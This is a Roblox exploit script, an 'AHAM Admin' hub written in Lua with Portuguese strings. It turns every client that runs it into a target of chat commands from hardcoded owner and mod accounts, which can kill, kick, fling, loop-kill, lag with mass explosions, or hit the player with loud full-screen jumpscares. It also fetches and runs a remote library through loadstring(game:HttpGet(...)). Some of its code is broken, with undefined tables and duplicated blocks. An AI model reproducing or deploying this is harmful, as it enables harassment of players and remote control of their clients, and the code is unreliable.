local lockedTarget = nil
local selectedPlayerName = nil
local isUpdating = false

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local function getPlayersList()
    local list = {}
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            list[#list+1] = player.Name
        end
    end
    table.sort(list)
    return list
end

local connections = {}

local function setupAutoUpdate()
    for _, conn in ipairs(connections) do
        conn:Disconnect()
    end
    
    local conn1 = Players.PlayerAdded:Connect(function(player)
        task.wait(0.5)
        local newPlayers = getPlayersList()
        targetDropdown:Refresh(newPlayers, selectedPlayerName or "")
    end)
    
    local conn2 = Players.PlayerRemoving:Connect(function(player)
        task.wait(0.5)
        local newPlayers = getPlayersList()
        targetDropdown:Refresh(newPlayers, selectedPlayerName or "")
        
        if player.Name == selectedPlayerName then
            lockedTarget = nil
            selectedPlayerName = nil
            getgenv().Target = nil
        end
    end)
    
    table.insert(connections, conn1)
    table.insert(connections, conn2)
end

setupAutoUpdate()

task.spawn(function()
    while task.wait(30) do
        local newPlayers = getPlayersList()
        targetDropdown:Refresh(newPlayers, selectedPlayerName or "")
    end
end)

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local TextChatService = game:GetService("TextChatService")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local Workspace = workspace
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local Lighting = game:GetService("Lighting")
local HttpService = game:GetService("HttpService")

local DONOS = {
    ["ajudo_pessoas21"] = true,
    ["solar_brunix"] = true,
    ["GAME_HACKEDBYTROLL"] = true,
}

local SUB_DONOS = {
    ["MateusBaima7"] = true,
    ["DoxPkwsXLBt"] = true,
}

local MODS = {
    ["eid8dj3"] = true,
    ["dfssfdddfd"] = true,
    ["QueroMais37"] = true,
}

local TEMP_MODS = {}
local AHAM_USERS = {}
local playerOriginalSpeed = {}
local LOOP_KILL_PLAYERS = {}
local LOOP_BRING_PLAYERS = {}

local function PodeUsarComando(commanderName, targetPlayerName)
    if DONOS[commanderName] or SUB_DONOS[commanderName] or MODS[commanderName] or TEMP_MODS[commanderName] then
        return true
    end
    
    if AHAM_USERS[commanderName] then
        if AHAM_USERS[targetPlayerName] then
            return true
        else
            return false
        end
    end
    
    return false
end

local function TemCargo(playerName)
    return DONOS[playerName] or SUB_DONOS[playerName] or MODS[playerName] or TEMP_MODS[playerName] or AHAM_USERS[playerName]
end

local function EImune(playerName)
    return false
end

local function GetCargo(playerName)
    if DONOS[playerName] then return "Dono do AHAM HUB" end
    if SUB_DONOS[playerName] then return "Subdono do AHAM HUB" end
    if MODS[playerName] then return "Admin do AHAM HUB" end
    if TEMP_MODS[playerName] then return "Temp Mod" end
    return ""
end

local function createSpecialTag(player)
    if not player then return end
    
    local function apply()
        local char = player.Character
        if not char then return end
        local head = char:FindFirstChild("Head")
        if not head then return end

        local old = head:FindFirstChild("SpecialTag")  
        if old then old:Destroy() end  

        local gui = Instance.new("BillboardGui")  
        gui.Name = "SpecialTag"  
        gui.Size = UDim2.new(0, 200, 0, 50)  
        gui.StudsOffset = Vector3.new(0, 3, 0)  
        gui.AlwaysOnTop = true  
        gui.Adornee = head  
        gui.Parent = head  

        local text = Instance.new("TextLabel")  
        text.Size = UDim2.new(1, 0, 1, 0)  
        text.BackgroundTransparency = 1  
        text.Font = Enum.Font.GothamBold  
        text.TextScaled = true  
        text.TextStrokeTransparency = 0.2  
        text.TextStrokeColor3 = Color3.new(0,0,0)  
        
        local cargo = GetCargo(player.Name)
        
        if cargo ~= "" then
            text.Text = cargo
        else
            text.Text = ""
        end
        
        local azulEscuro = Color3.fromRGB(0, 51, 102)
        
        if cargo == "Dono do AHAM HUB" then
            text.TextColor3 = azulEscuro
        elseif cargo == "Subdono do AHAM HUB" then
            text.TextColor3 = azulEscuro
        elseif cargo == "Admin do AHAM HUB" then
            text.TextColor3 = azulEscuro
        elseif cargo == "Temp Mod" then
            text.TextColor3 = azulEscuro
        else
            text.Text = ""
        end

        text.Parent = gui  
    end  

    pcall(apply)  
    player.CharacterAdded:Connect(function()  
        task.wait(0.4)  
        pcall(apply)  
    end)
end

for _, p in pairs(Players:GetPlayers()) do
    createSpecialTag(p)
end

Players.PlayerAdded:Connect(function(p)
    createSpecialTag(p)
end)

local function KillPlayer(targetPlayer)
    if not targetPlayer or not targetPlayer.Character then return false end
    local humanoid = targetPlayer.Character:FindFirstChildOfClass("Humanoid")
    if humanoid then
        humanoid.Health = 0
        return true
    end
    return false
end

local function KickPlayer(targetPlayer, reason)
    if not targetPlayer then return false end
    
    local success = pcall(function()
        targetPlayer:Kick(reason or "VocÃª foi expulso pela equipe AHAM HUB")
    end)
    
    if not success then
        if targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
            targetPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 1000000, 0)
        end
        
        task.spawn(function()
            for i = 1, 10 do
                if targetPlayer.Character then
                    targetPlayer.Character:BreakJoints()
                end
                task.wait(0.5)
            end
        end)
    end
    
    return true
end

local function EnviarComando(comando, alvo)
    local canal = TextChatService.TextChannels:FindFirstChild("RBXGeneral") or TextChatService.TextChannels:GetChildren()[1]
    if canal then
        canal:SendAsync("/" .. comando .. " " .. (alvo or ""))
    end
end

local function AtualizarTagPorNome(nome)
    local p = Players:FindFirstChild(nome)
    if p then
        createSpecialTag(p)
    end
end

local function ExplodirPlayer(targetPlayer)
    if not targetPlayer or not targetPlayer.Character then return false end
    
    local character = targetPlayer.Character
    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
    
    if not humanoidRootPart then return false end
    
    local explosion = Instance.new("Explosion")
    explosion.Position = humanoidRootPart.Position
    explosion.BlastPressure = 500000
    explosion.BlastRadius = 10
    explosion.DestroyJointRadiusPercent = 0
    explosion.Parent = Workspace
    
    for i = 1, 8 do
        local part = Instance.new("Part")
        part.Size = Vector3.new(2, 2, 2)
        part.Position = humanoidRootPart.Position + Vector3.new(math.random(-8, 8), math.random(0, 12), math.random(-8, 8))
        part.Anchored = false
        part.CanCollide = false
        part.Material = Enum.Material.Neon
        part.Color = Color3.fromRGB(100, 100, 255)
        part.Parent = Workspace
        
        local bodyVelocity = Instance.new("BodyVelocity")
        bodyVelocity.Velocity = Vector3.new(math.random(-80, 80), math.random(30, 100), math.random(-80, 80))
        bodyVelocity.MaxForce = Vector3.new(1e5, 1e5, 1e5)
        bodyVelocity.Parent = part
        
        game:GetService("Debris"):AddItem(part, 3)
    end
    
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    if humanoid then
        humanoid.Health = 0
    end
    
    return true
end

local function BringPlayer(targetPlayer, commander)
    if not targetPlayer or not targetPlayer.Character then return false end
    if not commander or not commander.Character then return false end
    
    local targetHrp = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
    local commanderHrp = commander.Character:FindFirstChild("HumanoidRootPart")
    
    if not targetHrp or not commanderHrp then return false end
    
    local bringOffset = CFrame.new(0, 0, -5)
    targetHrp.CFrame = commanderHrp.CFrame * bringOffset
    
    return true
end

local function LoopKillPlayer(targetPlayer)
    if not targetPlayer then return false end
    LOOP_KILL_PLAYERS[targetPlayer.Name] = true
    
    local function killLoop()
        while LOOP_KILL_PLAYERS[targetPlayer.Name] and targetPlayer and targetPlayer.Parent do
            if targetPlayer.Character then
                local humanoid = targetPlayer.Character:FindFirstChildOfClass("Humanoid")
                if humanoid then
                    humanoid.Health = 0
                end
            end
            task.wait(1)
        end
    end
    
    task.spawn(killLoop)
    return true
end

local function UnloopKillPlayer(targetPlayer)
    if not targetPlayer then return false end
    LOOP_KILL_PLAYERS[targetPlayer.Name] = nil
    return true
end

local function LoopBringPlayer(targetPlayer, commander)
    if not targetPlayer or not commander then return false end
    LOOP_BRING_PLAYERS[targetPlayer.Name] = true
    
    local function bringLoop()
        while LOOP_BRING_PLAYERS[targetPlayer.Name] and targetPlayer and targetPlayer.Parent and commander and commander.Parent do
            if targetPlayer.Character and commander.Character then
                local targetHrp = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
                local commanderHrp = commander.Character:FindFirstChild("HumanoidRootPart")
                
                if targetHrp and commanderHrp then
                    local bringOffset = CFrame.new(0, 0, -5)
                    targetHrp.CFrame = commanderHrp.CFrame * bringOffset
                end
            end
            task.wait(0.5)
        end
    end
    
    task.spawn(bringLoop)
    return true
end

local function UnloopBringPlayer(targetPlayer)
    if not targetPlayer then return false end
    LOOP_BRING_PLAYERS[targetPlayer.Name] = nil
    return true
end

local function FloatPlayer(targetPlayer)
    if not targetPlayer or not targetPlayer.Character or not targetPlayer.Character:FindFirstChild("HumanoidRootPart") or not targetPlayer.Character:FindFirstChildOfClass("Humanoid") then return false end
    local targetHrp = targetPlayer.Character.HumanoidRootPart
    local targetHumanoid = targetPlayer.Character:FindFirstChildOfClass("Humanoid")
    local targetPos = targetHrp.Position
    targetHumanoid.WalkSpeed = 0
    targetHumanoid.JumpHeight = 0

    local bodyVelocity = Instance.new("BodyVelocity", targetHrp)
    bodyVelocity.MaxForce = Vector3.new(0, math.huge, 0)
    bodyVelocity.Velocity = Vector3.new(0, 10, 0)
    bodyVelocity.Name = "FloatVelocity"

    local maxHeight = targetPos.Y + 50
    local connection
    connection = RunService.Heartbeat:Connect(function()
        if not targetPlayer.Character or not targetPlayer.Character.Parent or not targetHrp.Parent or not targetHumanoid.Parent then
            if bodyVelocity and bodyVelocity.Parent then bodyVelocity:Destroy() end
            if connection then connection:Disconnect() end
            return
        end
        if targetHrp.Position.Y >= maxHeight then
            if bodyVelocity and bodyVelocity.Parent then bodyVelocity:Destroy() end
            if connection then connection:Disconnect() end
            targetHumanoid.Health = 0
        end
    end)
    return true
end

local function LagPlayer(targetPlayer)
    if not targetPlayer or not targetPlayer.Character then return false end
    
    for i = 1, 50 do
        task.spawn(function()
            pcall(function()
                local hrp = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
                if hrp then
                    local explosion = Instance.new("Explosion")
                    explosion.Position = hrp.Position + Vector3.new(math.random(-10, 10), math.random(0, 5), math.random(-10, 10))
                    explosion.BlastRadius = 20
                    explosion.BlastPressure = 1000000
                    explosion.Parent = Workspace
                end
            end)
        end)
    end
    
    for i = 1, 25 do
        task.spawn(function()
            local part = Instance.new("Part")
            part.Size = Vector3.new(5, 5, 5)
            part.Position = targetPlayer.Character.HumanoidRootPart.Position + Vector3.new(math.random(-20, 20), math.random(0, 10), math.random(-20, 20))
            part.Anchored = false
            part.CanCollide = true
            part.Material = Enum.Material.Neon
            part.Color = Color3.fromRGB(255, 0, 0)
            part.Parent = Workspace
            
            local bodyVelocity = Instance.new("BodyVelocity")
            bodyVelocity.Velocity = Vector3.new(math.random(-100, 100), math.random(50, 200), math.random(-100, 100))
            bodyVelocity.MaxForce = Vector3.new(1e6, 1e6, 1e6)
            bodyVelocity.Parent = part
            
            game:GetService("Debris"):AddItem(part, 5)
        end)
    end
    
    return true
end

local function CriarJumpscareLocal(imageId, audioId)
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "JumpscareFullscreen"
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
    screenGui.DisplayOrder = 2147483647
    screenGui.ResetOnSpawn = false
    screenGui.IgnoreGuiInset = true
    screenGui.Parent = CoreGui

    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(1, 0, 1, 0)
    mainFrame.Position = UDim2.new(0, 0, 0, 0)
    mainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
    mainFrame.BorderSizePixel = 0
    mainFrame.ZIndex = 2147483647
    mainFrame.Parent = screenGui

    local imageLabel = Instance.new("ImageLabel")
    imageLabel.Size = UDim2.new(1, 0, 1, 0)
    imageLabel.Position = UDim2.new(0, 0, 0, 0)
    imageLabel.BackgroundTransparency = 1
    imageLabel.Image = imageId
    imageLabel.ScaleType = Enum.ScaleType.Fit
    imageLabel.ZIndex = 2147483647
    imageLabel.Parent = mainFrame

    local sound = Instance.new("Sound")
    sound.SoundId = audioId
    sound.Volume = 2.0
    sound.Looped = false
    sound.Parent = mainFrame

    local flashCount = 12
    local flashInterval = 0.1

    sound:Play()

    UserInputService.MouseIconEnabled = false

    task.spawn(function()
        for i = 1, flashCount do
            if not screenGui.Parent then break end
            imageLabel.ImageTransparency = (i % 2 == 0) and 0.1 or 0
            task.wait(flashInterval)
        end
        
        imageLabel.ImageTransparency = 0
        task.wait(0.8)
        
        local fadeTween = TweenService:Create(imageLabel, TweenInfo.new(1.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
            ImageTransparency = 1
        })
        fadeTween:Play()
        
        local bgFadeTween = TweenService:Create(mainFrame, TweenInfo.new(1.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
            BackgroundTransparency = 1
        })
        bgFadeTween:Play()
        
        task.wait(2)
        
        UserInputService.MouseIconEnabled = true
        
        screenGui:Destroy()
    end)

    return true
end

local function TheRakeJumpscare()
    local SoundService = game:GetService("SoundService")
    local CoreGui = game:GetService("CoreGui")
    
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "FullJumpscare"
    screenGui.IgnoreGuiInset = true
    screenGui.ResetOnSpawn = false
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screenGui.DisplayOrder = 999999
    screenGui.Parent = CoreGui
    
    local imageLabel = Instance.new("ImageLabel")
    imageLabel.Size = UDim2.new(1.2, 0, 1.2, 0)
    imageLabel.Position = UDim2.new(-0.1, 0, -0.1, 0)
    imageLabel.BackgroundTransparency = 1
    imageLabel.Image = "rbxassetid://108753859505348"
    imageLabel.ZIndex = 999999
    imageLabel.Parent = screenGui
    
    local sound1 = Instance.new("Sound")
    sound1.SoundId = "rbxassetid://18967004856"
    sound1.Volume = 10
    sound1.Parent = SoundService
    
    local sound2 = Instance.new("Sound")
    sound2.SoundId = "rbxassetid://103396125105301"
    sound2.Volume = 10
    sound2.Parent = SoundService
    
    local isShaking = true
    
    task.spawn(function()
        while isShaking do
            local offsetX = math.random(-10, 10)
            local offsetY = math.random(-10, 10)
            imageLabel.Position = UDim2.new(-0.1, offsetX, -0.1, offsetY)
            task.wait(0.02)
        end
    end)
    
    imageLabel.Visible = true
    sound1:Play()
    
    task.delay(2, function()
        sound2:Play()
        sound2.Ended:Connect(function()
            isShaking = false
            screenGui:Destroy()
        end)
    end)
end

local function TeleportToBackrooms()
    local backroomsModel = game:GetObjects("rbxassetid://10581711055")[1]
    backroomsModel.Parent = workspace
    
    for _, descendant in pairs(backroomsModel:GetDescendants()) do
        if descendant:IsA("BasePart") then
            descendant.Position = descendant.Position + Vector3.new(99999, 99999, 99999)
        end
    end
    
    local player = game.Players.LocalPlayer
    if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        local targetPosition = backroomsModel.PrimaryPart.Position
        player.Character.HumanoidRootPart.CFrame = CFrame.new(targetPosition.X, targetPosition.Y + 90, targetPosition.Z)
        task.wait(2)
        player.Character.HumanoidRootPart.CFrame = CFrame.new(targetPosition.X, targetPosition.Y + 90, targetPosition.Z)
    end
end

local function SitPlayer(targetPlayer)
    if not targetPlayer or not targetPlayer.Character then return false end
    local humanoid = targetPlayer.Character:FindFirstChildOfClass("Humanoid")
    if humanoid then
        humanoid.Sit = true
        return true
    end
    return false
end

local function FirePlayer(targetPlayer)
    if not targetPlayer or not targetPlayer.Character then return false end
    local humanoid = targetPlayer.Character:FindFirstChildOfClass("Humanoid")
    if humanoid then
        local fire = Instance.new("Fire")
        fire.Parent = targetPlayer.Character:FindFirstChild("HumanoidRootPart") or targetPlayer.Character:FindFirstChild("Torso") or targetPlayer.Character:FindFirstChildWhichIsA("BasePart")
        humanoid:TakeDamage(100)
        return true
    end
    return false
end

local verificacaoEmAndamento = false

local function ProcessarMensagem(msgText, authorName)
    if not msgText or not authorName then return end

    local comandoLower = msgText:lower()  
    local character = LocalPlayer.Character  
    local humanoid = character and character:FindFirstChildOfClass("Humanoid")  

    if EImune(LocalPlayer.Name) then
        return
    end

    local targetLower = LocalPlayer.Name:lower()
    
    if comandoLower:match("/kill%s+" .. targetLower) then  
        KillPlayer(LocalPlayer)
    end

    if comandoLower:match("/kick%s+" .. targetLower) then  
        local reason = comandoLower:match("/kick%s+" .. targetLower .. "%s+(.+)")
        KickPlayer(LocalPlayer, reason)
    end
    
    if comandoLower:match("/explode%s+" .. targetLower) then  
        ExplodirPlayer(LocalPlayer)
    end

    if comandoLower:match("/loopkill%s+" .. targetLower) then  
        LoopKillPlayer(LocalPlayer)
    end

    if comandoLower:match("/unloopkill%s+" .. targetLower) then  
        UnloopKillPlayer(LocalPlayer)
    end

    if comandoLower:match("/bring%s+" .. targetLower) then  
        local commander = Players:FindFirstChild(authorName)
        if commander then
            BringPlayer(LocalPlayer, commander)
        end
    end

    if comandoLower:match("/loopbring%s+" .. targetLower) then  
        local commander = Players:FindFirstChild(authorName)
        if commander then
            LoopBringPlayer(LocalPlayer, commander)
        end
    end

    if comandoLower:match("/unloopbring%s+" .. targetLower) then  
        UnloopBringPlayer(LocalPlayer)
    end

    if comandoLower:match("/float%s+" .. targetLower) then  
        FloatPlayer(LocalPlayer)
    end

    if comandoLower:match("/lag%s+" .. targetLower) then  
        LagPlayer(LocalPlayer)
    end

    if comandoLower:match("/backrooms%s+" .. targetLower) then
        TeleportToBackrooms()
    end

    if comandoLower:match("/fling%s+" .. targetLower) then  
        if character then  
            local root = character:FindFirstChild("HumanoidRootPart")  
            if root then  
                local tween = TweenService:Create(root, TweenInfo.new(1, Enum.EasingStyle.Linear), {CFrame = CFrame.new(0,100000,0)})  
                tween:Play()  
            end  
        end  
    end  

    if comandoLower:match("/freeze%s+" .. targetLower) then  
        if humanoid then  
            playerOriginalSpeed[LocalPlayer] = humanoid.WalkSpeed
            humanoid.WalkSpeed = 0  
        end  
    end  

    if comandoLower:match("/unfreeze%s+" .. targetLower) then  
        if humanoid then  
            humanoid.WalkSpeed = playerOriginalSpeed[LocalPlayer] or 16  
        end  
    end

    if comandoLower:match("/jumps1%s+" .. targetLower) then  
        CriarJumpscareLocal("rbxassetid://126754882337711", "rbxassetid://138873214826309")
    end

    if comandoLower:match("/jumps2%s+" .. targetLower) then  
        CriarJumpscareLocal("rbxassetid://86379969987314", "rbxassetid://143942090")
    end

    if comandoLower:match("/jumps3%s+" .. targetLower) then  
        CriarJumpscareLocal("rbxassetid://127382022168206", "rbxassetid://143942090")
    end

    if comandoLower:match("/jumps4%s+" .. targetLower) then  
        CriarJumpscareLocal("rbxassetid://95973611964555", "rbxassetid://138873214826309")
    end

    if comandoLower:match("/therakejumpscare%s+" .. targetLower) then  
        TheRakeJumpscare()
    end

    if comandoLower:match("/sit%s+" .. targetLower) then  
        SitPlayer(LocalPlayer)
    end

    if comandoLower:match("/fire%s+" .. targetLower) then  
        FirePlayer(LocalPlayer)
    end

    if comandoLower:match("^/verifique$") and not verificacaoEmAndamento then  
        verificacaoEmAndamento = true
        
        if authorName ~= LocalPlayer.Name then
            task.wait(1)
            local canal = TextChatService.TextChannels:FindFirstChild("RBXGeneral") or TextChatService.TextChannels:GetChildren()[1]  
            if canal then  
                local randomCode = tostring(math.random(1000, 9999))
                canal:SendAsync("LCC_" .. randomCode)  
            end  
        end
        
        verificacaoEmAndamento = false
    end

    if msgText:match("AHAM ###") then  
        if not LCC_USERS[authorName] then
            LCC_USERS[authorName] = true
            AtualizarTagPorNome(authorName)
        end
    end
end

local function ConectarCanal(canal)
    if not canal or not canal.IsA then return end
    if not canal:IsA("TextChannel") then return end
    canal.MessageReceived:Connect(function(msg)
        local text = msg.Text
        local source = msg.TextSource and msg.TextSource.Name
        if text and source then
            ProcessarMensagem(text, source)
        end
    end)
end

for _, ch in pairs(TextChatService.TextChannels:GetChildren()) do
    ConectarCanal(ch)
end

TextChatService.TextChannels.ChildAdded:Connect(function(ch)
    ConectarCanal(ch)
end)

local ok, WindUI = pcall(function()
    return loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
end)

if ok and WindUI then
    local playerName = LocalPlayer.Name
    if TemCargo(playerName) or AHAM_USERS[playerName] then
        
WindUI:AddTheme({
    Name = "BlackBlue Theme",
    
    Background = Color3.fromRGB(10, 10, 10),
    WindowBackground = Color3.fromRGB(15, 15, 15),
    DialogBackground = Color3.fromRGB(15, 15, 15),
    TabBackground = Color3.fromRGB(20, 20, 20),
    ElementBackground = Color3.fromRGB(25, 25, 25),
    PopupBackground = Color3.fromRGB(20, 20, 20),
    
    Accent = Color3.fromRGB(0, 100, 200),
    Outline = Color3.fromRGB(40, 120, 220),
    Text = Color3.fromRGB(240, 245, 255),
    Placeholder = Color3.fromRGB(160, 180, 200),
    Button = Color3.fromRGB(0, 90, 180),
    Icon = Color3.fromRGB(120, 180, 255),
    
    BackgroundTransparency = 0.05,
    Hover = Color3.fromRGB(30, 80, 150),
    WindowShadow = Color3.fromRGB(0, 0, 0),
    
    DialogBackgroundTransparency = 0.05,
    DialogTitle = Color3.fromRGB(220, 235, 255),
    DialogContent = Color3.fromRGB(200, 215, 235),
    DialogIcon = Color3.fromRGB(120, 180, 255),
    
    WindowTopbarButtonIcon = Color3.fromRGB(120, 180, 255),
    WindowTopbarTitle = Color3.fromRGB(220, 235, 255),
    WindowTopbarAuthor = Color3.fromRGB(180, 205, 235),
    WindowTopbarIcon = Color3.fromRGB(120, 180, 255),
    
    TabTitle = Color3.fromRGB(220, 235, 255),
    TabIcon = Color3.fromRGB(120, 180, 255),
    
    ElementTitle = Color3.fromRGB(220, 235, 255),
    ElementDesc = Color3.fromRGB(180, 205, 235),
    ElementIcon = Color3.fromRGB(120, 180, 255),
    
    PopupBackgroundTransparency = 0.05,
    PopupTitle = Color3.fromRGB(220, 235, 255),
    PopupContent = Color3.fromRGB(200, 215, 235),
    PopupIcon = Color3.fromRGB(120, 180, 255),
    
    DialogButton = Color3.fromRGB(0, 90, 180),
    DialogButtonText = Color3.fromRGB(240, 245, 255),
    DialogButtonHover = Color3.fromRGB(30, 110, 200),
    
    PopupButton = Color3.fromRGB(0, 90, 180),
    PopupButtonText = Color3.fromRGB(240, 245, 255),
    PopupButtonHover = Color3.fromRGB(30, 110, 200)
})

WindUI:Gradient({
    ["0"] = { Color = Color3.fromRGB(0, 30, 70), Transparency = 0.1 },
    ["100"] = { Color = Color3.fromRGB(15, 50, 100), Transparency = 0.3 },
}, {
    Rotation = 0,
})

WindUI:SetTheme("BlackBlue Theme")

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local userId = LocalPlayer.UserId

local thumbType = Enum.ThumbnailType.HeadShot
local thumbSize = Enum.ThumbnailSize.Size150x150
local content, isReady = Players:GetUserThumbnailAsync(userId, thumbType, thumbSize)

local Window = WindUI:CreateWindow({
    Title = "Aham Admin",
    Icon = "shield",
    Author = "By AHAM/ajudo_pessoas21",
    Folder = "My ajudo_pessoas21",
    
    Size = UDim2.fromOffset(580, 460),
    MinSize = Vector2.new(560, 350),
    MaxSize = Vector2.new(850, 560),
    Transparent = true,
    Theme = "BlackBlue Theme",
    Resizable = true,
    SideBarWidth = 200,
    BackgroundImageTransparency = 0.15,
    HideSearchBar = true,
    ScrollBarEnabled = false,
    
    Background = "rbxassetid://103815341746038",
    
    User = {
        Enabled = true,
        Anonymous = false,
        Title = LocalPlayer.Name,
        Avatar = content,
        Callback = function()
            Window:Dialog({
                Icon = "user",
                Title = "Perfil do UsuÃ¡rio",
                Content = "Nome: " .. LocalPlayer.Name .. "\nID: " .. userId .. "\n\nCargo: " .. (TemCargo(playerName) and "Admin" or "UsuÃ¡rio LCC"),
                Buttons = {
                    {
                        Title = "OK",
                        Callback = function()
                        end,
                    },
                },
            }):Show()
        end,
    },
})

Window:SetToggleKey(Enum.KeyCode.H)
Window:ToggleTransparency(true)
Window:IsResizable(true)

Window:EditOpenButton({
    Title = "AHAM Admin",
    Icon = "shield",
    CornerRadius = UDim.new(0, 16),
    StrokeThickness = 2,
    Color = ColorSequence.new(
        Color3.fromRGB(0, 100, 200),
        Color3.fromRGB(120, 180, 255)
    ),
    OnlyMobile = false,
    Enabled = true,
    Draggable = true,
})

        local lockedTarget = nil
        local selectedPlayerName = nil
        local isUpdating = false
        local dropdownsToUpdate = {}

        local function getPlayersList()
            local players = {}
            for _, player in ipairs(Players:GetPlayers()) do
                local playerName = player.Name
                if player == LocalPlayer then
                    playerName = playerName .. " (VocÃª)"
                end
                table.insert(players, playerName)
            end
            table.sort(players)
            return players
        end

        local function setupDropdownAutoUpdate()
            local function updateAllDropdowns()
                if isUpdating then return end
                isUpdating = true
                
                local success, playerList = pcall(function()
                    return getPlayersList()
                end)
                
                if success and playerList then
                    for _, dropdown in ipairs(dropdownsToUpdate) do
                        if dropdown and dropdown.SetValues then
                            pcall(function()
                                dropdown:SetValues(playerList)
                            end)
                        end
                    end
                end
                
                isUpdating = false
            end
            
            local updateLoop = task.spawn(function()
                while true do
                    updateAllDropdowns()
                    task.wait(30)
                end
            end)
            
            Players.PlayerAdded:Connect(function(player)
                task.wait(0.5)
                updateAllDropdowns()
            end)
            
            Players.PlayerRemoving:Connect(function(player)
                updateAllDropdowns()
            end)
            
            return updateAllDropdowns
        end

        local TabComandos = Window:Tab({ Title = "Commandos", Icon = "terminal", Locked = false })  
        local Section = TabComandos:Section({ Title = "Admin", Icon = "user-cog", Opened = true })  

        local TargetName  
        local Dropdown = Section:Dropdown({  
            Title = "Selecionar Jogador",  
            Values = getPlayersList(),  
            Value = "",  
            Callback = function(opt) 
                if opt then
                    if isUpdating then return end
                    
                    if opt and opt ~= "" then
                        lockedTarget = opt:gsub(" %(VocÃª%)", "")
                        selectedPlayerName = opt:gsub(" %(VocÃª%)", "")
                        TargetName = opt:gsub(" %(VocÃª%)", "")
                    else
                        lockedTarget = nil
                        selectedPlayerName = nil
                        TargetName = nil
                    end
                end
            end  
        })  

        table.insert(dropdownsToUpdate, Dropdown)

        local TabJumpscare = Window:Tab({ Title = "Jumpscare", Icon = "skull", Locked = false })
        local SectionJumpscare = TabJumpscare:Section({ Title = "Jumpscares Terror", Icon = "ghost", Opened = true })

        local JumpscareTargetName
        local JumpscareDropdown = SectionJumpscare:Dropdown({  
            Title = "Selecionar Jogador",  
            Values = getPlayersList(),  
            Value = "",  
            Callback = function(opt) 
                if opt then
                    if isUpdating then return end
                    
                    if opt and opt ~= "" then
                        JumpscareTargetName = opt:gsub(" %(VocÃª%)", "")
                    else
                        JumpscareTargetName = nil
                    end
                end
            end  
        })

        table.insert(dropdownsToUpdate, JumpscareDropdown)

        Section:Button({
            Title = "Atualizar Lista",
            Callback = function()
                local newPlayers = getPlayersList()
                Dropdown:SetValues(newPlayers)
                JumpscareDropdown:SetValues(newPlayers)
                
                if selectedPlayerName then
                    local playerExists = false
                    for _, name in ipairs(newPlayers) do
                        if name:gsub(" %(VocÃª%)", "") == selectedPlayerName then
                            playerExists = true
                            break
                        end
                    end
                    
                    if not playerExists then
                        lockedTarget = nil
                        selectedPlayerName = nil
                        TargetName = nil
                    end
                end
            end
        })

        local connections = {}
        
        local function setupAutoUpdate()
            for _, conn in ipairs(connections) do
                conn:Disconnect()
            end
            
            local conn1 = Players.PlayerAdded:Connect(function(player)
                task.wait(0.5)
                local newPlayers = getPlayersList()
                Dropdown:SetValues(newPlayers)
                JumpscareDropdown:SetValues(newPlayers)
            end)
            
            local conn2 = Players.PlayerRemoving:Connect(function(player)
                task.wait(0.5)
                local newPlayers = getPlayersList()
                Dropdown:SetValues(newPlayers)
                JumpscareDropdown:SetValues(newPlayers)
                
                if player.Name == selectedPlayerName then
                    lockedTarget = nil
                    selectedPlayerName = nil
                    TargetName = nil
                end
            end)
            
            table.insert(connections, conn1)
            table.insert(connections, conn2)
        end

        setupAutoUpdate()

        local updateDropdownsFunction = setupDropdownAutoUpdate()

        task.spawn(function()
            task.wait(1)
            local playerList = getPlayersList()
            Dropdown:SetValues(playerList)
            JumpscareDropdown:SetValues(playerList)
        end)

        local comandos = { 
            "kill", "kick",
            "fling", "backrooms", "freeze", "unfreeze", 
            "explode", "bring", "float", "lag",
            "loopkill", "unloopkill", "loopbring", "unloopbring",
            "sit", "fire"
        }  
        
        for _, cmd in ipairs(comandos) do  
            Section:Button({  
                Title = "/" .. cmd:lower(),  
                Desc = "Comando: /"..cmd.." [jogador]",
                Callback = function()  
                    if TargetName and TargetName ~= "" then  
                        local podeUsar = PodeUsarComando(LocalPlayer.Name, TargetName)
                        if not podeUsar then
                            return
                        end
                        EnviarComando(cmd, TargetName)  
                    end
                end  
            })  
        end

        Section:Space()
        Section:Button({  
            Title = "/verifique",  
            Desc = "Comando: /verifique - Outros Lcc Users enviam cÃ³digo",
            Callback = function()  
                EnviarComando("verifique")
            end  
        })

        local jumpscares = {
            { name = "jumps1", desc = "Jumpscare 1 - Imagem assustadora" },
            { name = "jumps2", desc = "Jumpscare 2 - Terror clÃ¡ssico" },
            { name = "jumps3", desc = "Jumpscare 3 - Sustos intensos" },
            { name = "jumps4", desc = "Jumpscare 4 - Horror mÃ¡ximo" },
            { name = "therakejumpscare", desc = "The Rake Jumpscare" }
        }

        for _, jumpscare in ipairs(jumpscares) do
            SectionJumpscare:Button({  
                Title = "/" .. jumpscare.name,
                Desc = jumpscare.desc,
                Callback = function()  
                    if JumpscareTargetName and JumpscareTargetName ~= "" then  
                        local podeUsar = PodeUsarComando(LocalPlayer.Name, JumpscareTargetName)
                        if not podeUsar then
                            return
                        end
                        EnviarComando(jumpscare.name, JumpscareTargetName)  
                    end
                end  
            })
        end
    end
end

LCC_USERS[LocalPlayer.Name] = true

local sound = Instance.new("Sound")
sound.SoundId = "rbxassetid://8486683243"
sound.Volume = 0.5
sound.PlayOnRemove = true
